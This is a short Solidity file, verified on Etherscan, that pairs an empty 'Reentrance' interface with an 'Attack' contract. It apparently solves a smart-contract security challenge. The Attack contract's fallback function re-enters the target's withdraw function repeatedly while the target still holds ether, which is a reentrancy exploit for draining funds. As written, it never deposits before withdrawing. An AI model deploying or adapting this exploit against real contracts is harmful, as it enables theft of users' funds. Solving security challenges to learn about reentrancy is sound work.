/**
 *Submitted for verification at Etherscan.io on 2022-07-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {}

  function balanceOf(address _who) public view returns (uint balance) {}

  function withdraw(uint _amount) public {}

  receive() external payable {}
}

contract Attack {

  Reentrance challenge;

  constructor(address payable addr) public payable {
    challenge = Reentrance(addr);
  }

  function attack() public {
    challenge.withdraw(0.001 ether);
  }

  fallback() external payable {
    if (address(challenge).balance > 0 ) {
      challenge.withdraw(0.001 ether);
    }
  }
}